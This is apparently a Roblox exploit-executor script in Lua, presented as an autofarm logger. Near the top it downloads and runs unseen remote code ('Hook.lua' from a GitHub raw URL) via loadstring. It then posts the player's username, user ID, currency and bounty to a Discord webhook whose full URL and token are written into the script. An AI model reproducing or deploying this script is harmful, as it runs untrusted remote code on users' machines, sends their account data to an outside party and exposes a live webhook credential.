
local Profit = game.Players.LocalPlayer.DataFolder.Currency.Value
local Tick = os.time()

loadstring(game:HttpGet("https://raw.githubusercontent.com/mrhackerman35297/Data/main/Hook.lua"))()

local money = function(Num)
	return tostring(Num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end
local url = "https://discord.com/api/webhooks/1137541903143948288/ePJDY-d2JIXqywNMIlyHTGuq4sDcC6_rnd6SNc04bw_FNg4kzfY5wqiwWAJq3-cxfKWF"
    local data = {
        ["content"] =  "",
        ["embeds"] = {
            {
                ["title"] = ('Autofarm Log'),
                ["description"] = "**Username:\n**"..game.Players.LocalPlayer.Name.." ("..game.Players.LocalPlayer.UserId..")",
                ["type"] = "rich",
                ["color"] = tonumber(0xFFFFFF),
                ["fields"] = {
                    {
                        ["name"] = "Money:",
                        ["value"] = '```'..money(game.Players.LocalPlayer.DataFolder.Currency.Value)..'```',
                        ["inline"] = true,
                    },
                    {
                        ["name"] = "Profits:",
                        ["value"] = '```'..money(game.Players.LocalPlayer.DataFolder.Currency.Value - Profit)..'```',
                        ["inline"] = true,
                    },
                    {
                        ["name"] = "Bounty:",
                        ["value"] = '```'..money(game.Players.LocalPlayer.leaderstats.Wanted.Value)..'```',
                        ["inline"] = true,
                    },
                    {
                        ["name"] = "Elapsed:",
                        ["value"] = '```'..string.format("%02i:%02i:%02i", (os.time()-Tick)/60^2, (os.time()-Tick)/60%60, (os.time()-Tick)%60)..'```',
                        ["inline"] = false,
                    },
                    {
                        ["name"] = "Credits:",
                        ["value"] = '9kDestroyer',
                        ["inline"] = false,
                    },
                }, 
            }
        }
    }
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    
    local headers = {
        ["content-type"] = "application/json"
    }
    request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    request(abcdef)
